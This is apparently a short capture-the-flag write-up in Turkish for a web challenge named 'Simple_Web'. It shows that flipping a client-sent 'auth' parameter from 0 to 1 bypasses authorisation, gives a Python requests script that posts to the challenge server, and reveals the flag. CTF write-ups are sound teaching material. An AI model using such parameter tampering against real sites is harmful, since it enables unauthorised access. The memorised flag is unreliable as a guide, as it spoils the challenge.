# Simple_Web
## Jb3lp0is

Siteye flag icin formu onaylayip gonderdigimizde yetkimizin olmadigini soyluyor.

Gonderirken istegin header'ina baktigmizda auth parametresinin 0 olarak gittigini goruyoruz.

1 yapip tekrar gonderince flag'e ulasiyoruz.

```python

import requests as r


URL = "http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag"

data = {
    "flag" : 1,
    "auth" : 1,
}

req = r.post(URL,data=data)

print(req.text)


```


dctf{w3b_c4n_b3_fun_r1ght?}
